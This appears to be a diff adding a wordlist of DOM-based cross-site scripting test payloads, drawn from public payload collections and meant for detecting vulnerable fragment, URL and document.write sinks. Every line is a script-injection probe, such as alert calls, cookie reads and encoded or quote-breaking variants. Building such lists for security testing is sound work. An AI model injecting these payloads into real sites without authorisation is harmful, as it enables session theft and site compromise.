@@ -1,0 +1,18 @@
+# XSS DOM-Based Payloads
+# Sources: SecLists, PayloadsAllTheThings
+# Purpose: Detect DOM-based XSS triggered via fragment, URL, or document.write sinks.
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:alert(document.domain)
+#<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+#<svg onload=alert(1)>
+"><script>alert(1)</script>
+"><svg onload=alert(1)>
+'><script>alert(1)</script>
+\"><script>alert(1)</script>
+\x3Cscript\x3Ealert(1)\x3C/script\x3E
+%3Cscript%3Ealert(1)%3C/script%3E
+<script>document.location='javascript:alert(1)'</script>
+<img src=x onerror="javascript:alert(1)">
+data:text/html,<script>alert(1)</script>
